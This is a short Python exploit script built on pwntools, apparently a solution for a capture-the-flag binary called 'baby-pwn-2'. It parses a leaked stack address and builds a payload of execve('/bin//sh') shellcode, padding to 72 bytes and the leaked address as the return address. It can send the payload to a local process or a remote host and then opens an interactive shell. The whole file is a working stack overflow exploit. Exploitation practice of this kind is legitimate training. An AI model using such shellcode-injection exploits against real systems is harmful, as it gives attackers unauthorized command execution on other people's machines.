#!/usr/bin/python3
from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break
'''.format(**locals())

exe = './baby-pwn-2'
elf = context.binary = ELF(exe, checksec=False)
#context.log_level = 'debug'


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")


io = start()


padding = 72
output= io.recvline()
shellcode =b"\x48\x31\xFF\x57\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x48\x31\xF6\x48\x31\xD2\x48\x89\xE7\x48\x31\xC0\x48\x83\xC0\x3B\x0F\x05"
stack_leak = int(io.recvline().split(b" leak:")[1].strip().decode("utf-8"),16)
log.info( "stack leak: "+hex(stack_leak))
junk=(padding-(len(shellcode))) *"A"
payload = flat(
    shellcode,
    junk,
    p64(stack_leak)

)
write("payload", payload)


io.sendlineafter(b'text:', payload)

io.interactive()
